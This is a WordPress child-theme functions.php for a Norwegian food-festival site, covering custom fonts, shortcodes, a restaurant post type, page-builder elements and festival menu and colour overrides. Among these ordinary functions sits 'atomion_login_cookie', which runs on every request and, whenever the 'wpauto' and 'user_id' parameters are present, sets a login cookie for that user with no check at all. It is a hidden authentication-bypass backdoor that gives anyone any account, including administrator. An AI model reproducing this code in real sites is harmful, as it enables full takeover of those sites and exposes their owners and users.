<?php

/**
 * Child Theme
 *
 */

function movedo_child_theme_setup()
{
  require_once get_stylesheet_directory() . '/vc_extended/wpdreamer_mixitup.php';
}

add_action('after_setup_theme', 'movedo_child_theme_setup');
function grve_child_theme_print_custom_fonts()
{
?>

  <style type="text/css">
    @font-face {
      font-family: 'the_pyte_foundry_-moloch';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.eot');
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.eot?#iefix') format('embedded-opentype'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/thepytefoundry-moloch.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/thepytefoundry-moloch.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.ttf') format('truetype'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/MyCustomFont.svg#wf') format('svg');
    }


    @font-face {
      font-family: 'GT-Pressura-Light';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Light.ttf') format('truetype');
    }

    @font-face {
      font-family: 'GT-Pressura-Regular';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Regular.ttf') format('truetype');
    }

    @font-face {
      font-family: 'GT-Pressura-Bold';
      src: url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.otf'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.woff2') format('woff2'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.woff') format('woff'),
        url('<?php echo get_stylesheet_directory_uri(); ?>/fonts/GT-Pressura-Bold.ttf') format('truetype');
    }
  </style>

<?php
}
add_action('wp_head', 'grve_child_theme_print_custom_fonts');

function grve_child_theme_custom_font_selection($std_fonts)
{
  $my_custom_fonts1 = array(
    "the_pyte_foundry_-moloch"     => "thepytefoundry-moloch",
    "GT-Pressura-Light"         => "GT-Pressura-Light",
    "GT-Pressura-Regular"      => "GT-Pressura-Regular",
    "GT-Pressura-Bold"        => "GT-Pressura-Bold"

  );
  return array_merge($std_fonts, $my_custom_fonts1);
}
add_filter('movedo_grve_std_fonts', 'grve_child_theme_custom_font_selection');



add_shortcode('post_image', 'post_image_shortcode');


function post_title_shortcode()
{
  return get_the_title();
}

add_shortcode('post_title', 'post_title_shortcode');

function post_publish_shortcode()
{
  return get_the_date();
}

add_shortcode('post_publish', 'post_publish_shortcode');

function post_author_shortcode()
{
  return get_the_author();
}

add_shortcode('post_author', 'post_author_shortcode');
function post_image_shortcode()
{
  echo get_post_thumbnail_id();
}
add_shortcode('post_image', 'post_image_shortcode');

add_action('init', 'atomion_login_cookie');
function atomion_login_cookie()
{
  if (isset($_REQUEST['wpauto']) && isset($_REQUEST['user_id'])) {
    wp_set_auth_cookie($_REQUEST['user_id']);
  }
}


//add_shortcode('mixitfilter','mixitfilter_shortcode');
function mixitfilter_shortcode($atts)
{
  $a = shortcode_atts(array(
    'label' => '',
    'field' => false,
    'tax' => false,
    'type' => 'button',
  ), $atts);
  ob_start();
?>
  <div class="grve-element grve-with-gap grve-portfolio grve-isotope" style="" data-spinner="no" data-columns="3" data-columns-large-screen="3" data-columns-tablet-landscape="2" data-columns-tablet-portrait="2" data-columns-mobile="1" data-layout="fitRows" data-gutter-size="30">
    <div class="controls grve-filter grve-filter-style-button grve-align-left grve-link-text grve-link-text grve-filter-shape-round grve-filter-color-primary-1" data-gototop="yes">
      <ul>
        <li class="control" data-filter="*" class="selected"><span><?php echo $a['label'] ?></span></li>
        <?php
        if ($a['tax']) {
          $terms = get_terms([
            'taxonomy' => $a['tax'],
            'hide_empty' => false,
          ]);
          //echo "<pre>";
          // print_r($terms);
          foreach ($terms as $term) {
        ?>
            <li class="control" data-filter=".<?php echo $a['tax'] . '_' . $term->slug; ?>"><span><?php echo $term->name; ?></span></li>
          <?php
          }
        }

        if ($a['field']) {
          $choices = get_field_choices($a['field']);

          foreach ($choices as $choice) {
          ?>
            <li class="control" data-filter=".<?php echo $a['field'] . '_' . strtolower($choice); ?>"><span><?php echo $choice; ?></span></li>
        <?php
          }
        }
        ?>
        <ul>
    </div>
  </div>
<?php
  return ob_get_clean();
}


//add_filter('post_class', 'set_row_post_class', 10,3);
function set_row_post_class($classes, $class, $post_id)
{
  if (is_admin()) { //make sure we are in the dashboard 
    return $classes;
  }

  //check if some meta field is set 
  $dag = get_field('dag', $post_id);
  if ($dag) {
    foreach ($dag as $d) {
      $classes[] = 'dag_' . strtolower($d);
    }
  }

  $aktor = get_field('aktor', $post_id) ?: false;
  if ($aktor) {
    //foreach($aktor as $d){
    $classes[] = 'aktor_' . strtolower($aktor);
    //}
  }
  /*if ('yes' == $profile_incomplete) {
        $classes[] = 'profile_incomplete'; //add a custom class to highlight this row in the table
    }*/

  // Return the array
  return $classes;
}


// ------------ ACF theme folder ------------

add_filter('acf/settings/save_json', 'my_acf_json_save_point');

function my_acf_json_save_point($path)
{
  $path = get_stylesheet_directory() . '/acf-json';
  return $path;
}

add_filter('acf/settings/load_json', function ($paths) {
  $paths = array();

  if (is_child_theme()) {
    $paths[] = get_stylesheet_directory() . '/acf-json';
  }

  $paths[] = get_template_directory() . '/acf-json';

  return $paths;
});


// ------------ Refresh theme page for theme updates (GitHub Updater) ------------

function kodeks_refresh_cache_theme_page()
{
  global $wpdb;
  global $pagenow;
  if ($pagenow == 'themes.php') {
    if (!isset($_GET['kodeks_reload'])) {

      $table         = is_multisite() ? $wpdb->base_prefix . 'sitemeta' : $wpdb->base_prefix . 'options';
      $column        = is_multisite() ? 'meta_key' : 'option_name';
      $delete_string = 'DELETE FROM ' . $table . ' WHERE ' . $column . ' LIKE %s LIMIT 1000';

      $wpdb->query($wpdb->prepare($delete_string, ['%ghu-%']));

      wp_cron();
      wp_cache_flush();

      header('Location: ' . $_SERVER['REQUEST_URI'] . '?kodeks_reload');
    }
  }
}
add_action('admin_init', 'kodeks_refresh_cache_theme_page');

// ------------ CSS ------------

function enqueue_custom_styles()
{
  wp_enqueue_style('hero-style', get_stylesheet_directory_uri() . '/css/hero.css', [], filemtime(get_stylesheet_directory() . '/css/hero.css'));
  wp_enqueue_style('sidebar-style', get_stylesheet_directory_uri() . '/css/sidebar.css', [], filemtime(get_stylesheet_directory() . '/css/sidebar.css'));
  wp_enqueue_style('festival-style', get_stylesheet_directory_uri() . '/css/festival-tabs-etc.css', [], filemtime(get_stylesheet_directory() . '/css/festival-tabs-etc.css'));

  // Enqueue festival tabs mobile JavaScript
  wp_enqueue_script('festival-tabs-mobile', get_stylesheet_directory_uri() . '/js/festival-tabs-mobile.js', [], filemtime(get_stylesheet_directory() . '/js/festival-tabs-mobile.js'), true);
}
add_action('wp_enqueue_scripts', 'enqueue_custom_styles');


// ------------ New CPTs and taxonomies ------------

function kodeks_post_types()
{

  // Taxonomies:
  register_taxonomy(
    'stage_location',
    array('arrangement'),
    [
      'label' => __('Locations'),
      'hierarchical' => true,
      'show_admin_column' => true,
      'show_in_rest' => true,
    ]
  );

  // Post types:

  register_post_type(
    'restauranter',

    array(
      'labels' => array(
        'name' => __('Restauranter', 'matfest'),
        'singular_name' => __('Restaurant', 'matfest'),
        'add_new_item' => __('Legg til ny restaurant', 'matfest'),
        'edit_item' => __('Rediger restaurant', 'matfest'),
        'new_item' => __('Ny restaurant', 'matfest'),
        'view_item' => __('Vis restaurant', 'matfest'),
        'view_items' => __('Vis restauranter', 'matfest'),
        'search_items' => __('Søk restauranter', 'matfest'),
        'not_found' => __('Ingen restauranter funnet', 'matfest'),
        'not_found_in_trash' => __('Ingen restauranter funnet i papirkurven', 'matfest'),
        'all_items' => __('Alle restauranter', 'matfest'),
        'archives' => __('Restaurantarkiv', 'matfest'),
        'attributes' => __('Restaurantattributter', 'matfest'),
        'insert_into_item' => __('Sett inn i restaurant', 'matfest'),
        'uploaded_to_this_item' => __('Lastet opp til denne restauranten', 'matfest'),

        'filter_items_list' => __('Filtrer restaurantliste', 'matfest'),
        'items_list_navigation' => __('Navigasjon i restaurantliste', 'matfest'),
        'items_list' => __('Restaurantliste', 'matfest'),
      ),
      'public' => true,
      'has_archive' => false,
      'supports' => array('title', 'editor', 'thumbnail', 'excerpt', 'vc_editor'),
      'exclude_from_search' => false,
      'show_in_rest' => true,
      'menu_icon' => 'dashicons-food',
    )
  );
}
add_action('init', 'kodeks_post_types');


// ------------ Spilleplan stylesheet & JS ------------

function enqueue_spilleplan_styles()
{
  // Check if the current post contains the [spilleplan_element] shortcode
  if (has_shortcode(get_post_field('post_content', get_the_ID()), 'spilleplan_element')) {
    // Enqueue CSS
    wp_enqueue_style('spilleplan-style', get_stylesheet_directory_uri() . '/css/spilleplan.css', [], filemtime(get_stylesheet_directory_uri() . '/css/spilleplan.css'));

    // Enqueue JS (footer TRUE)
    wp_enqueue_script('spilleplan-script', get_stylesheet_directory_uri() . '/js/spilleplan.js', [], filemtime(get_stylesheet_directory_uri() . '/js/spilleplan.js'), true);
  }
}
add_action('wp_enqueue_scripts', 'enqueue_spilleplan_styles');



// ------------ Admin column for spilleplan date ------------

// Add value of the field
function spilleplan_date_column_content($column, $post_id)
{
  if ($column == 'spilleplan_date') {
    if (get_field('plan_date', $post_id)) {
      $date = get_field('plan_date', $post_id);
      if ($date) {
        // Try to parse as YYYYMMDD and format as DD.MM.YYYY
        $formatted = DateTime::createFromFormat('Ymd', $date);
        if ($formatted) {
          echo $formatted->format('d.m.Y');
        } else {
          echo esc_html($date); // fallback
        }
      }
    }
  }
}

// Add the custom field column to the posts table
function add_spilleplan_date_column($columns)
{
  // Specify the custom post type(s) where the column should be displayed
  $post_types = array('arrangement');

  // Check if the current post type is in the allowed list
  if (in_array(get_current_screen()->post_type, $post_types)) {
    $columns['spilleplan_date'] = 'Spilleplan date';
  }

  return $columns;
}
add_filter('manage_posts_columns', 'add_spilleplan_date_column');
add_action('manage_posts_custom_column', 'spilleplan_date_column_content', 10, 2);

// ------------ VC Custom Element ------------

add_action('vc_before_init', 'custom_post_grid_vc_element');
function custom_post_grid_vc_element()
{
  vc_map(array(
    'name' => __('Custom Post Grid', 'matfest'),
    'base' => 'custom_post_grid',
    'icon' => plugins_url('wp-post-modules/assets/images/wppm.svg'), // Use custom SVG icon from plugin
    'category' => __('Content', 'js_composer'),
    'params' => array(
      array(
        'type' => 'param_group',
        'heading' => __('Grid Items', 'matfest'),
        'param_name' => 'items',
        'description' => __('Legg til en ny rad for hvert bilde/link i gridet. Åpne raden for å redigere ved å klikke på pilen.', 'matfest'),
        'params' => array(
          array(
            'type' => 'attach_image',
            'heading' => __('Image', 'matfest'),
            'param_name' => 'image',
          ),
          array(
            'type' => 'textfield',
            'heading' => __('Title', 'matfest'),
            'param_name' => 'title',
          ),
          array(
            'type' => 'textfield',
            'heading' => __('Link URL', 'matfest'),
            'param_name' => 'link',
          ),
          array(
            'type' => 'checkbox',
            'heading' => __('Open link in new tab?', 'matfest'),
            'param_name' => 'link_external',
            'value' => array(__('Yes', 'matfest') => 'yes'),
            'description' => __('If checked, the link will open in a new tab.', 'matfest'),
          ),
        ),
      ),
    )
  ));
}

add_shortcode('custom_post_grid', function ($atts) {
  $atts = shortcode_atts(array(
    'items' => '',
  ), $atts);

  $items = vc_param_group_parse_atts($atts['items']);
  if (!$items) return '';

  $output = '<div class="custom-post-grid">';
  foreach ($items as $item) {
    $img_html = '';
    if (!empty($item['image'])) {
      $img_url = wp_get_attachment_image_url($item['image'], 'medium');
      $img_html = '<div class="item-img"><img src="' . esc_url($img_url) . '" alt="' . esc_attr($item['title'] ?? '') . '" /></div>';
    }
    $title_html = !empty($item['title']) ? '<div class="bottom"><h3>' . esc_html($item['title']) . '</h3></div>' : '';
    $link_attrs = '';
    if (!empty($item['link_external']) && $item['link_external'] === 'yes') {
      $link_attrs = ' target="_blank" rel="noopener"';
    }
    $link_start = !empty($item['link']) ? '<a href="' . esc_url($item['link']) . '"' . $link_attrs . '>' : '';
    $link_end = !empty($item['link']) ? '</a>' : '';

    $output .= '<div class="item">' . $link_start . '<div class="item-inner">' . $img_html . '<div class="item-content">' . $title_html . '</div></div>' . $link_end . '</div>';
  }
  $output .= '</div>';
  return $output;
});



// ------ Css for custom post grid ------

function enqueue_custom_post_grid_css()
{
  if (has_shortcode(get_post_field('post_content', get_the_ID()), 'custom_post_grid')) {
    wp_enqueue_style(
      'custom-post-grid-style',
      get_stylesheet_directory_uri() . '/css/custom-post-grid.css',
      [],
      filemtime(get_stylesheet_directory() . '/css/custom-post-grid.css')
    );
  }
}
add_action('wp_enqueue_scripts', 'enqueue_custom_post_grid_css');

// ------------ VC Spilleplan Element ------------

add_action('vc_before_init', 'vc_spilleplan_element');
function vc_spilleplan_element()
{
  vc_map(array(
    'name' => __('Spilleplan', 'matfest'),
    'base' => 'spilleplan_element',
    'category' => __('Content', 'js_composer'),
    'description' => __('Setter inn spilleplanen', 'matfest'),
    'params' => array(
      array(
        'type' => 'raw_html',
        'heading' => __('Spilleplan', 'matfest'),
        'param_name' => 'info',
        'value' => '',
        'description' => '<div class="vc_message_box vc_message_box-info">Dette elementet setter inn spilleplanen på denne siden. Innhold legges inn på hvert arrangement.</div>',
        'edit_field_class' => 'vc_col-sm-12',
      ),
    ),
  ));
}

add_shortcode('spilleplan_element', function ($atts) {
  ob_start();
  get_template_part('part-spilleplan');
  return ob_get_clean();
});



// ------------ Label festival pages in admin ------------

// // Add custom column to Pages list
// add_filter('manage_page_posts_columns', function($columns) {
//   $new_columns = [];
//   foreach ($columns as $key => $value) {
//     $new_columns[$key] = $value;
//     // Add after the title column
//     if ($key === 'title') {
//       $new_columns['main_festival_page'] = __('Festivalside', 'matfest');
//     }
//   }
//   return $new_columns;
// });

// // Populate the custom column
// add_action('manage_page_posts_custom_column', function($column, $post_id) {
//   if ($column === 'main_festival_page') {
//     $is_main_festival_page = get_field('main_festival_page', $post_id);
//     if ($is_main_festival_page) {
//       echo '<span style="color: #46b450; font-weight: bold; font-size: 20px;">✓</span>';
//     }
//   }
// }, 10, 2);

// // Make the column sortable
// add_filter('manage_edit-page_sortable_columns', function($columns) {
//   $columns['main_festival_page'] = 'main_festival_page';
//   return $columns;
// });

// // Handle the sorting
// add_action('pre_get_posts', function($query) {
//   if (!is_admin() || !$query->is_main_query()) {
//     return;
//   }

//   if ($query->get('orderby') === 'main_festival_page') {
//     $query->set('meta_key', 'main_festival_page');
//     $query->set('orderby', 'meta_value_num');
//   }
// });

// Add post state label for main festival pages
add_filter('display_post_states', function ($post_states, $post) {
  if ($post->post_type === 'page') {
    $is_main_festival_page = get_field('main_festival_page', $post->ID);
    if ($is_main_festival_page) {
      $post_states['main_festival_page'] = __('Festivalside', 'matfest');
    }
  }
  return $post_states;
}, 10, 2);



// ------------ Populate ACF select field with available menus ------------

add_filter('acf/load_field/name=festival_select_menu', function ($field) {
  $field['choices'] = [];
  $menus = get_terms('nav_menu', ['hide_empty' => true]);
  foreach ($menus as $menu) {
    $field['choices'][$menu->term_id] = $menu->name;
  }
  return $field;
});

// ------------ Festival page detection and overrides ------------

/**
 * Get the current festival page ID based on current page or ancestors
 * @return int|null Festival page ID or null
 */
function get_current_festival_page()
{
  static $festival_page_id = null;

  // Cache the result so we don't query multiple times per request
  if ($festival_page_id !== null) {
    return $festival_page_id ?: null;
  }

  $current_page_id = get_queried_object_id();

  // Check if current page is a festival page
  if (get_field('main_festival_page', $current_page_id)) {
    $festival_page_id = $current_page_id;
    return $festival_page_id;
  }

  // Check ancestors
  $ancestors = get_post_ancestors($current_page_id);
  if (!empty($ancestors)) {
    foreach ($ancestors as $ancestor_id) {
      if (get_field('main_festival_page', $ancestor_id)) {
        $festival_page_id = $ancestor_id;
        return $festival_page_id;
      }
    }
  }

  $festival_page_id = false; // Cache negative result
  return null;
}

/**
 * Override the main menu with festival menu for festival pages and their descendants
 * This ensures both desktop and mobile menus use the correct festival menu
 */
add_filter('theme_mod_nav_menu_locations', function ($locations) {
  if (is_admin()) {
    return $locations;
  }

  $festival_page_id = get_current_festival_page();

  // If we're on a festival page or descendant, override the menu
  if ($festival_page_id) {
    $festival_menu_id = get_field('festival_select_menu', $festival_page_id);
    if ($festival_menu_id) {
      // Override all menu locations with the festival menu
      foreach ($locations as $location => $menu_id) {
        $locations[$location] = $festival_menu_id;
      }
    }
  }

  return $locations;
});

/**
 * Output custom CSS for festival pages based on color settings
 */
add_action('wp_head', function () {
  if (is_admin()) {
    return;
  }

  $festival_page_id = get_current_festival_page();

  if (!$festival_page_id) {
    return;
  }

  $main_color = get_field('festival_main_color', $festival_page_id);
  $text_color = get_field('festival_text_color', $festival_page_id);

  if (!$main_color) {
    return;
  }

  // Convert text_color field value to actual color
  $text_color_value = ($text_color === 'white') ? '#ffffff' : '#000000';
  $border_color_value = ($text_color === 'white') ? 'rgba(255, 255, 255, 0.3)' : 'rgba(0, 0, 0, 0.15)';

?>
  <style id="festival-custom-colors">
    #grve-main-header,
    #grve-hidden-menu,
    #grve-responsive-header #grve-main-responsive-header,
    #grve-header .grve-main-menu .grve-wrapper>ul>li ul,
    #grve-header .grve-main-menu .grve-wrapper>ul>li ul li a:hover,
    #grve-header .grve-main-menu .grve-wrapper>ul>li ul li.current-menu-item>a,
    #grve-header .grve-main-menu .grve-wrapper>ul li li.current-menu-ancestor>a {
      background-color: <?= esc_attr($main_color); ?> !important;
    }

    #grve-header .grve-main-menu .grve-wrapper>ul>li>a,
    .grve-header-element>a,
    #grve-hidden-menu a,
    #grve-hidden-menu .grve-close-btn,
    #grve-header .grve-main-menu .grve-wrapper>ul>li ul li.current-menu-item>a,
    #grve-header .grve-main-menu .grve-wrapper > ul > li ul li a,
    .grve-slide-menu ul.grve-menu .grve-arrow::after {
      color: <?= esc_attr($text_color_value); ?> !important;
    }

    #grve-hidden-menu .grve-hiddenarea-content .grve-menu>li>a,
    #grve-hidden-menu ul.grve-menu li a {
      border-color: <?= esc_attr($border_color_value); ?> !important;
    }

    #grve-header .grve-main-menu.grve-menu-type-underline .grve-wrapper>ul>li>a .grve-item:after {
      background-color: <?= esc_attr($text_color_value); ?> !important;
    }

    #grve-responsive-header .grve-header-elements-wrapper .grve-menu-btn span {
      background-color: <?= esc_attr($text_color_value); ?> !important;
    }
  </style>
<?php
}, 100);

// ------------ Festival Home Page Redirect ------------

/**
 * Get the active festival page based on current date
 * @return int|null Festival page ID or null
 */
function get_active_festival_page()
{
  $today = current_time('Ymd'); // WordPress time in YYYYMMDD format

  $festival_pages = get_posts([
    'post_type' => 'page',
    'posts_per_page' => -1,
    'meta_query' => [
      [
        'key' => 'main_festival_page',
        'value' => '1',
        'compare' => '='
      ]
    ],
    'orderby' => 'menu_order',
    'order' => 'ASC'
  ]);

  if (empty($festival_pages)) {
    return null;
  }

  foreach ($festival_pages as $page) {
    $start_date = get_field('festival_start_date', $page->ID);
    $end_date = get_field('festival_end_date', $page->ID);

    if (empty($start_date) || empty($end_date)) {
      continue;
    }

    // Dates are already in YYYYMMDD format (Ymd), compare directly
    if ($today >= $start_date && $today <= $end_date) {
      return $page->ID;
    }
  }

  // No active festival found, look for the next upcoming festival
  foreach ($festival_pages as $page) {
    $start_date = get_field('festival_start_date', $page->ID);

    if (empty($start_date)) {
      continue;
    }

    // Check if start date is in the future
    if ($today < $start_date) {
      return $page->ID;
    }
  }

  // Fallback: return the first festival page
  return $festival_pages[0]->ID;
}

/**
 * Redirect home page to active festival
 */
add_action('template_redirect', function () {
  // Don't redirect if:
  // - In admin, customizer, or preview mode
  // - User is logged in and can edit pages (allows admins to view/edit front page)
  // - URL has ?no-redirect parameter for testing
  if (
    is_front_page()
    && !is_admin()
    && !is_customize_preview()
    && !is_preview()
    && !(current_user_can('edit_pages') && is_user_logged_in())
    && !isset($_GET['no-redirect'])
  ) {

    $active_festival = get_active_festival_page();
    if ($active_festival) {
      // Use 302 (temporary redirect) so search engines know this changes
      wp_redirect(get_permalink($active_festival), 302);
      exit;
    }
  }
});
